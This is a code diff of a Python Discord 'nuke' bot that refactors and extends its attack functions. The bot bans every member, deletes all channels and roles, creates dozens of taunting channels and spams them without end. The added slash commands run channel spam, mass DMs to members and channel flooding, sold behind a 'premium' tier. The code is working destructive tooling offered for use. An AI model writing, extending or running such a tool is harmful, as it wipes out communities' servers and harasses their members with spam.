@@ -29,7 +29,7 @@ baner = f'''
 
 SPAM_MESSAGE = "# 010101010-00-0-00-000100101011010101010101011001910101010010101010101001010 FKD BY WEPAIDDDDD GET BACKKKK https://discord.gg/wepaid @everyone @everyone @everyone"
 
-# Database setup (using SQLite for stability in this environment)
+# Database setup
 DB_PATH = "bot_data.db"
 
 def setup_db():
@@ -57,76 +57,46 @@ def add_premium(user_id):
 setup_db()
 
 async def delete_all_channels(guild):
-    deleted = 0
-    tasks = []
-    for channel in guild.channels:
-        tasks.append(channel.delete())
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for res in results:
-        if not isinstance(res, Exception):
-            deleted += 1
-    return deleted
+    tasks = [channel.delete() for channel in guild.channels]
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 async def delete_all_roles(guild):
-    deleted = 0
-    tasks = []
-    for role in guild.roles:
-        if role.name != "@everyone" and not role.managed:
-            tasks.append(role.delete())
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for res in results:
-        if not isinstance(res, Exception):
-            deleted += 1
-    return deleted
+    tasks = [role.delete() for role in guild.roles if role.name != "@everyone" and not role.managed]
+    await asyncio.gather(*tasks, return_exceptions=True)
 
 async def ban_all_members(guild):
-    banned = 0
-    tasks = []
-    for member in guild.members:
-        if member != guild.me and member != guild.owner:
-            tasks.append(member.ban())
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for res in results:
-        if not isinstance(res, Exception):
-            banned += 1
-    return banned
+    tasks = [member.ban() for member in guild.members if member != guild.me and member != guild.owner]
+    await asyncio.gather(*tasks, return_exceptions=True)
 
-async def spam_channel(channel):
-    while True:
-        try:
-            await channel.send(SPAM_MESSAGE)
-            await asyncio.sleep(0.5)
-        except:
-            break
+async def spam_task(channel, message, count=None):
+    if count:
+        for _ in range(count):
+            try:
+                await channel.send(message)
+                await asyncio.sleep(0.5)
+            except: break
+    else:
+        while True:
+            try:
+                await channel.send(message)
+                await asyncio.sleep(0.5)
+            except: break
 
-async def create_nuke_channels(guild):
-    created_channels = []
-    names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
-    tasks = []
-    for _ in range(50):
-        tasks.append(guild.create_text_channel(name=random.choice(names)))
-    results = await asyncio.gather(*tasks, return_exceptions=True)
-    for res in results:
-        if not isinstance(res, Exception):
-            created_channels.append(res)
-    return created_channels
-
-async def nuke_guild(guild):
-    print(f'{r}[!] Starting nuke on: {m}{guild.name}')
+async def nuke_guild(guild, custom_message=None):
+    msg = custom_message or SPAM_MESSAGE
     await ban_all_members(guild)
     await delete_all_channels(guild)
     await delete_all_roles(guild)
-    channels = await create_nuke_channels(guild)
-    for channel in channels:
-        asyncio.create_task(spam_channel(channel))
+    names = ["[😂] 𝐆𝐄𝐓𝐁𝐀𝐂𝐊", "[☠️] 𝟕𝟔𝟐𝐇𝐔𝐑𝐓", "[😭] 𝐅𝐊𝐃 𝐁𝐘 𝐖𝐄𝐏𝐀𝐈𝐃", "[🤑] 𝐖𝐄 𝐎𝐖𝐍 𝐘𝐎𝐔"]
+    for _ in range(50):
+        try:
+            channel = await guild.create_text_channel(name=random.choice(names))
+            asyncio.create_task(spam_task(channel, msg))
+        except: continue
 
 # Main entry point
 token = environ.get('DISCORD_BOT_TOKEN')
 prefix = environ.get('DISCORD_PREFIX', '.')
-
-if not token:
-    print(f"{r}[!] DISCORD_BOT_TOKEN not found in secrets!")
-    exit()
 
 class MyBot(commands.Bot):
     def __init__(self):
@@ -144,35 +114,56 @@ async def on_ready():
     print(f'''
 {c}--------------------------------------------
 {g}[+] Logged in as {client.user}
-{g}[+] Total Servers: {len(client.guilds)}
-{y}[!] Prefix: {prefix}
 {y}[!] Slash Commands Enabled
 {c}--------------------------------------------''')
 
-@client.tree.command(name="nuke", description="Start the nuke process")
-async def nuke_slash(interaction: discord.Interaction):
-    if not is_premium(interaction.user.id):
-        return await interaction.response.send_message("❌ This command is for premium users only!", ephemeral=True)
-    await interaction.response.send_message("🚀 Nuke process started!", ephemeral=True)
-    await nuke_guild(interaction.guild)
+# --- Slash Commands ---
 
-@client.tree.command(name="add_premium", description="Give a user lifetime premium (Owner Only)")
-@app_commands.describe(user="The user to give premium")
+@client.tree.command(name="nuke", description="Full server nuke")
+@app_commands.describe(message="Custom spam message (optional)")
+async def nuke_slash(interaction: discord.Interaction, message: str = None):
+    if not is_premium(interaction.user.id):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🚀 Nuke Started!", ephemeral=True)
+    await nuke_guild(interaction.guild, message)
+
+@client.tree.command(name="spam", description="Spam current channel")
+@app_commands.describe(message="Message to spam", amount="How many times (blank for infinite)")
+async def spam_slash(interaction: discord.Interaction, message: str, amount: int = None):
+    if not is_premium(interaction.user.id):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("💥 Spam Started!", ephemeral=True)
+    asyncio.create_task(spam_task(interaction.channel, message, amount))
+
+@client.tree.command(name="massdm", description="DM all members")
+@app_commands.describe(message="Message to send")
+async def massdm_slash(interaction: discord.Interaction, message: str):
+    if not is_premium(interaction.user.id):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("📩 Mass DM Started!", ephemeral=True)
+    for member in interaction.guild.members:
+        if member != client.user and not member.bot:
+            try: await member.send(message)
+            except: continue
+
+@client.tree.command(name="flood", description="Flood with channels")
+@app_commands.describe(name="Channel names", amount="Amount (max 100)")
+async def flood_slash(interaction: discord.Interaction, name: str, amount: int = 50):
+    if not is_premium(interaction.user.id):
+        return await interaction.response.send_message("❌ Premium Only!", ephemeral=True)
+    await interaction.response.send_message("🌊 Flooding...", ephemeral=True)
+    for _ in range(min(amount, 100)):
+        try: await interaction.guild.create_text_channel(name=name)
+        except: break
+
+@client.tree.command(name="add_premium", description="Grant lifetime premium")
 async def add_premium_slash(interaction: discord.Interaction, user: discord.User):
     if not await client.is_owner(interaction.user):
-         return await interaction.response.send_message("❌ You are not authorized to use this command.", ephemeral=True)
-    
+         return await interaction.response.send_message("❌ Owner Only!", ephemeral=True)
     add_premium(user.id)
-    await interaction.response.send_message(f"✅ {user.name} has been granted lifetime premium!", ephemeral=True)
-
-@client.command()
-async def nuke(ctx):
-    if not is_premium(ctx.author.id):
-        return await ctx.send("❌ This command is for premium users only!")
-    print(f'{y}[!] Nuke command executed in {ctx.guild.name} by {ctx.author}')
-    await nuke_guild(ctx.guild)
+    await interaction.response.send_message(f"✅ {user.name} is now Premium!", ephemeral=True)
 
 try:
     client.run(token)
 except Exception as e:
-    print(f'{r}[!] Critical Error: {e}')
+    print(f'{r}[!] Error: {e}')
